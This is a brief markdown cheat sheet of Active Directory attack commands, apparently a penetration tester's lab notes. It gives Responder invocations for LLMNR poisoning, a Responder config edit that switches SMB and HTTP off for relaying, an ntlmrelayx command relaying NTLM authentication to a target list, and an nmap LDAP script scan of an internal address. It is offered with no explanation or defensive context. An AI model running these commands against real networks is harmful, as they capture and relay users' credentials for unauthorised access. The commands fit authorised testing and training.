# ADAttacking

## LLMNR poisioning

```
python3 responder -I tun0 -rdwv
```

Edit responder. 

```
sudo nano /usr/share/responder.conf
```
---
## SMB Relay Attack (Respoonder)

```
python3 responder -I tun0 -rdwv
```

Edit responder. 

```
sudo nano /usr/share/responder.conf
# SMB OFF
# HTTP OFF
```

## NTLMRelay

```
ntlmrelayx.py -tf targets.txt -smb2support
```
---

## LDAP Brute

```
nmap -n -sV --script "ldap* and not brute" -p 389 10.10.0.9 -Pn
```
